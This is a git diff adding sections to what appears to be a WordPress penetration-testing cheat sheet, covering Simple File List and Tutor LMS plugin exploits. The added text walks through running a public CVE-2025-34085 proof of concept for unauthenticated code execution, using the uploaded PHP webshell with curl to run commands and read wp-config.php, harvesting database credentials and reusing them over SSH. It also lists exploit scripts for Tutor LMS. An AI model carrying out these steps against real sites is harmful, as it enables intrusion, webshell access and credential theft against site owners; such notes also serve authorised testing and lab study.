@@ -144,6 +144,82 @@ Use the first or second for Meterpreter; the third runs a single command via `?c
 
 ## Vulnerable Plugins
 
+### Simple File List 4.2.2 pre-auth RCE
+
+WordPress **Simple File List** versions around `4.2.2` can be abused for unauthenticated file upload / RCE. This is useful when WPScan finds the plugin under `/wp-content/plugins/simple-file-list/` and the WordPress site has public uploads enabled.
+
+```bash
+wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
+```
+
+Look for:
+
+```text
+[+] simple-file-list
+ | Location: http://TARGET/wp-content/plugins/simple-file-list/
+ | Version: 4.2.2
+```
+
+Uploads commonly land under:
+
+```text
+http://TARGET/wp-content/uploads/simple-file-list/
+```
+
+Public reference:
+
+* CVE-2025-34085 PoC
+
+```bash
+git clone https://github.com/0xgh057r3c0n/CVE-2025-34085.git
+cd CVE-2025-34085
+python3 CVE-2025-34085.py -u http://TARGET --cmd id
+```
+
+Expected output includes the uploaded PHP path:
+
+```text
+[DEBUG] Command Output:
+uid=33(http) gid=33(http) groups=33(http)
+
+[+] http://TARGET | http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php
+```
+
+Use the webshell directly and read WordPress config for credential reuse:
+
+```bash
+curl 'http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php?cmd=id'
+curl 'http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php?cmd=cat%20../../../wp-config.php'
+```
+
+High-value values:
+
+```php
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'username');
+define('DB_PASSWORD', 'password');
+define('DB_HOST', 'localhost');
+```
+
+If the DB username also exists as a system user, try SSH with the database password:
+
+```bash
+ssh username@TARGET
+```
+
+### Tutor LMS authenticated issues
+
+Tutor LMS old versions, such as `1.5.3`, may have authenticated attack paths. Check registration first; if registration is disabled, you need existing credentials before using authenticated PoCs.
+
+```bash
+python3 exploit-cve-2024-3553-v2.py http://TARGET --check-only
+```
+
+Useful references:
+
+* CVE-2024-10400: `https://github.com/k0ns0l/CVE-2024-10400`
+* CVE-2024-3553: `https://github.com/RandomRobbieBF/CVE-2024-3553`
+
 ### mail-masta LFI (unauthenticated)
 
 ```bash
@@ -218,3 +294,4 @@ define('DB_USER', 'username');
 define('DB_PASSWORD', 'password');
 define('DB_HOST', 'localhost');
 ```
+
